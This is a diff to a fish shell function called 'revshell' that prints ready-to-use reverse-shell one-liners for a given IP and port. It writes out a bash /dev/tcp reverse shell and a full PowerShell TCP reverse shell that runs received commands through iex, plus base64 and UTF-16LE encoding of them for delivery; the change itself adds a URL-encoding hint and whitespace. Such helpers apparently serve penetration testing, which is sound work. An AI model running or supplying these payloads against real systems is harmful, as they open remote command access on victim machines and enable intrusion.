@@ -7,6 +7,8 @@ function revshell --description 'Print reverse-shell one-liners (bash/python/php
     set -l ip $argv[1]
     set -l port $argv[2]
 
+    # URL Encode Command
+    echo -e "[+] Command to URL Encode: jq -nr --arg v \"<COMMAND TO ENCODE>\" '\$v|@uri'"
     # Bash reverse shell
     set -l bash_shell "/usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
 
@@ -14,7 +16,7 @@ function revshell --description 'Print reverse-shell one-liners (bash/python/php
     set -l shell_encode (printf "%s" "$bash_shell" | base64 -w 0)
 
     # PowerShell TCP reverse shell
-    set -l ps_cmd "\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+    set -l ps_cmd "\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()  "
 
     # Encode PowerShell as UTF-16LE Base64 (single line)
     set -l ps_base64 (printf "%s" "$ps_cmd" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
